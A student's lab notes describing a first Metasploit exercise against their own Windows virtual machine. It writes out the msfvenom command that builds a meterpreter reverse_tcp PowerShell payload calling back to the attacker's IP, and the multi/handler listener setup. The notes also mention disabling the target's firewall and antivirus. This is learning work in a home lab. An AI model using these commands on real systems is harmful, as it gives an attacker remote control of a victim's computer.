## Metasploit

-   I wanted to learn more about metasploit so I looked through youtube and found [this](https://www.youtube.com/watch?v=xuYZNJCvHgQ&t=1166s) video.

-   In this video I was able to learn how to use reverse tcp to gain access to a target's computer

-   First I had to create a windows vm to imitate a windows user, after multiple failures of the virtual machines not syncing, I found a solution, which was to switch the network from NAT to bridged and allow VMs to communicate in Orcale VirutalBox.

-   After this, I followed the video's command which was `msfvenom -p  windows/x64/meterpreter/reverse_tcp LHOST=[kali-ip-address] LPORT=4444 -f psh-cmd`. Here we create a payload using "`msfvenom -p`" then we specify that its a `windows x64` device, and spawns a `meterpreter` shell when `reverse_tcp` is successful and brings it back to us at LHOST and LPORT, the "`-f`" specifies the output format, and in this case its a powershell command.

-   After this I opened a new tab where I used `msfconsole` and under `use exploit/multi/handler` I specified the payload `set payload windows/x64/meterpreter/reverse_tcp` then the `set LHOST [ip-address]`, then used `exploit` to start and wait for the reverse tcp connection

-   After this I copy and pasted the long powershell command generated by the msfvenom command and pasted it inside the windows terminal \*after disabling` the windows firewall and anti-virus for testing purposes.

-   This successfully enabled me to take control of the target's machine and search and directory I wanted on the targets machine.

-   I hope to learn more about metasploit and other techniques
